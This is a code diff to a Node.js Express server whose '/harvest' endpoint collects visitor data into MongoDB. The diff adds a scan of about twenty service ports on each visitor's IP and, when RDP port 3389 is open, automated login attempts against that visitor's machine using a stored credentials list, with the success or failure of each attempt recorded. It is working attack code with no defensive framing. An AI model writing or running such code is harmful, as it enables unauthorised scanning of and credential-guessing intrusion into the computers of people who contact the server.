@@ -3,12 +3,59 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const { MongoClient } = require('mongodb');
 const net = require('net'); // Import the net module
+const rdpCredentials = require('./rdp_credentials'); // Import RDP credentials
+const rdp = require('node-rdpjs'); // Import node-rdpjs
+
+// Function to attempt RDP login
+async function attemptRDPLogin(ip, username, password) {
+  return new Promise((resolve) => {
+    const client = rdp.createClient({
+      domain: '', // No domain specified for direct IP connection
+      userName: username,
+      password: password,
+      autoLogin: true,
+      screen: { width: 1024, height: 768 }, // Dummy screen size
+      logLevel: 'INFO',
+    });
+
+    let connectionTimeout = setTimeout(() => {
+      client.removeAllListeners();
+      resolve({ username, password, success: false, error: 'Connection timed out', timestamp: new Date().toISOString() });
+      client.destroy(); // Ensure client resources are released
+    }, 5000); // 5 second timeout for the RDP connection attempt
+
+    client.on('connect', () => {
+      clearTimeout(connectionTimeout);
+      client.removeAllListeners();
+      resolve({ username, password, success: true, timestamp: new Date().toISOString() });
+      client.destroy(); // Disconnect after successful login
+    });
+
+    client.on('error', (err) => {
+      clearTimeout(connectionTimeout);
+      client.removeAllListeners();
+      const errorMessage = err.message || err.toString();
+      resolve({ username, password, success: false, error: errorMessage, timestamp: new Date().toISOString() });
+      client.destroy();
+    });
+
+    client.on('close', () => {
+      // This event might fire after 'connect' or 'error'.
+      // If the promise has already been resolved, do nothing.
+      // Otherwise, it indicates a connection failure that wasn't caught by 'error'.
+    });
+
+    client.connect(ip, 3389);
+  });
+}
 
 const app = express();
 const port = 3003;
 
-// Function to check if RDP port (3389) is open
-async function checkRDPPort(ip) {
+const TARGET_PORTS = [21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 3389, 8080, 8443, 5900, 5985, 5986, 3306, 5432, 1433, 1521, 27017];
+
+// Function to check if a specific port is open
+async function checkPort(ip, targetPort) {
   return new Promise((resolve) => {
     const socket = new net.Socket();
     socket.setTimeout(1000); // 1 second timeout
@@ -28,8 +75,20 @@ async function checkRDPPort(ip) {
       resolve(false); // Error, port likely closed or unreachable
     });
 
-    socket.connect(3389, ip);
+    socket.connect(targetPort, ip);
   });
+}
+
+// Function to check multiple target ports
+async function checkMultiplePorts(ip) {
+  const openPorts = [];
+  for (const targetPort of TARGET_PORTS) {
+    const isOpen = await checkPort(ip, targetPort);
+    if (isOpen) {
+      openPorts.push(targetPort);
+    }
+  }
+  return openPorts;
 }
 
 const mongoUrl = process.env.MONGODB_URI;
@@ -72,12 +131,28 @@ app.post('/harvest', async (req, res) => {
   data.clientIp = clientIp;
   console.log('Client IP:', clientIp);
 
-  // Check for open RDP port
-  const isRdpOpen = await checkRDPPort(clientIp);
-  data.rdpOpen = isRdpOpen;
-  console.log(`RDP port 3389 on ${clientIp} is ${isRdpOpen ? 'open' : 'closed'}`);
+  // Check for open ports
+  const openPorts = await checkMultiplePorts(clientIp);
+  data.openPorts = openPorts;
+  console.log(`Open ports on ${clientIp}: ${openPorts.length > 0 ? openPorts.join(', ') : 'None'}`);
+
+  // Check if RDP port (3389) is among the open ports
+  const isRdpOpen = openPorts.includes(3389);
+  data.rdpOpen = isRdpOpen; // Keep this for backward compatibility and specific RDP logic
+
+  // If RDP port is open, attempt logins with provided credentials
+  if (isRdpOpen) {
+    console.log(`Attempting RDP logins for ${clientIp}...`);
+    const loginAttempts = [];
+    for (const cred of rdpCredentials) {
+      const attemptResult = await attemptRDPLogin(clientIp, cred.username, cred.password);
+      loginAttempts.push(attemptResult);
+      console.log(`  Attempted login for ${cred.username}: ${attemptResult.success ? 'Success' : 'Failed'} (Error: ${attemptResult.error || 'None'})`);
+    }
+    data.rdpLoginAttempts = loginAttempts;
+  }
   
-  console.log('Harvested data with IP and RDP status:', data);
+  console.log('Harvested data with IP, open ports, RDP status, and login attempts:', data);
 
   try {
     const db = client.db();
